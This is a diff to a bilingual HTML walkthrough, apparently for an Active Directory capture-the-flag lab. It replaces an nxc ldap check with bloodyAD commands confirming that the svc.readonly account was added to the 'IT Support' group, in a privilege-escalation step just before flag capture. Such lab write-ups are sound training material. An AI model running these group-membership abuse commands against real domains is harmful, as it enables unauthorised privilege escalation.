@@ -41,11 +41,12 @@ net rpc group addmem 'IT Support' 'svc.readonly' \
 # samba-tool group addmembers "IT Support" svc.readonly</pre>
 
     <h3>3 · Confirmar la pertenencia</h3>
-    <pre>nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' \
-  --query "(sAMAccountName=svc.readonly)" "memberOf"
+    <p><code>nxc ldap</code> no funciona contra este DC (falla el bind NTLM, ver AD 02) — usa <code>bloodyAD</code>:</p>
+    <pre>bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+  get object 'IT Support' --attr member
 
 bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
-  get object 'IT Support' --attr member</pre>
+  get object svc.readonly --attr memberOf</pre>
     <p>Importante: la pertenencia a grupos se materializa en un <strong>nuevo</strong> ticket Kerberos / nueva sesión. Vuelve a autenticarte para que el token incluya el grupo.</p>
 
     <h3>4 · Capturar la flag</h3>
@@ -91,11 +92,12 @@ net rpc group addmem 'IT Support' 'svc.readonly' \
 # samba-tool group addmembers "IT Support" svc.readonly</pre>
 
     <h3>3 · Confirm the membership</h3>
-    <pre>nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' \
-  --query "(sAMAccountName=svc.readonly)" "memberOf"
+    <p><code>nxc ldap</code> does not work against this DC (the NTLM bind fails, see AD 02) — use <code>bloodyAD</code>:</p>
+    <pre>bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+  get object 'IT Support' --attr member
 
 bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
-  get object 'IT Support' --attr member</pre>
+  get object svc.readonly --attr memberOf</pre>
     <p>Important: group membership only lands in a <strong>fresh</strong> Kerberos ticket / new session. Re-authenticate so the token carries the group.</p>
 
     <h3>4 · Capture the flag</h3>
